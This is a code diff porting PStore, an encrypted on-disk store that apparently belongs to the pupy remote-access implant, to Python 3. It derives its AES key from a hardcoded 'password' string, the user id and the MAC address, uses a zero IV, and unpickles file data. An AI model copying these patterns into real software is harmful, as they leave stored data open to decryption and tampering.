@@ -10,7 +10,13 @@ __all__ = ('PStore',)
 import hashlib
 import uuid
 import os
-import cPickle
+import sys
+import struct
+
+if sys.version_info.major > 2:
+    import pickle
+else:
+    import cPickle as pickle
 
 import pupy
 
@@ -28,13 +34,6 @@ class PStore(object):
         '_pstore_path', '_pstore_key', '_pstore'
     )
 
-    def __new__(cls, *args, **kw):
-        if not hasattr(cls, '_instance'):
-            orig = super(PStore, cls)
-            cls._instance = orig.__new__(cls, *args, **kw)
-
-        return cls._instance
-
     def __init__(self, pstore_dir='~'):
         try:
             import getpass
@@ -45,7 +44,12 @@ class PStore(object):
             else:
                 uid = ''
 
-        seed = '{}:{}'.format(uid, uuid.getnode())
+        if not isinstance(uid, bytes):
+            uid = uid.encode('latin1')
+
+        seed = uid + b':' + struct.pack(
+            '<Q', uuid.getnode()
+        )
 
         h = hashlib.sha1()
         h.update(seed)
@@ -66,7 +70,7 @@ class PStore(object):
         )
 
         h = hashlib.sha1()
-        h.update('password' + seed)
+        h.update(b'password' + seed)
 
         self._pstore_key = (h.digest()[:16], '\x00'*16)
         self._pstore = {}
@@ -102,7 +106,7 @@ class PStore(object):
 
             data = NewAESCipher(*self._pstore_key).decrypt(data)
             data = strip_PKCS7_padding(data)
-            data = cPickle.loads(data)
+            data = pickle.loads(data)
         except:
             pupy.remote_error('Pstore (load)')
             return
@@ -120,7 +124,7 @@ class PStore(object):
                 os.makedirs(pstore_dir)
 
             with open(self._pstore_path, 'w+b') as pstore:
-                data = cPickle.dumps(self._pstore)
+                data = pickle.dumps(self._pstore)
                 data = append_PKCS7_padding(data)
                 data = NewAESCipher(*self._pstore_key).encrypt(data)
                 pstore.write(data)
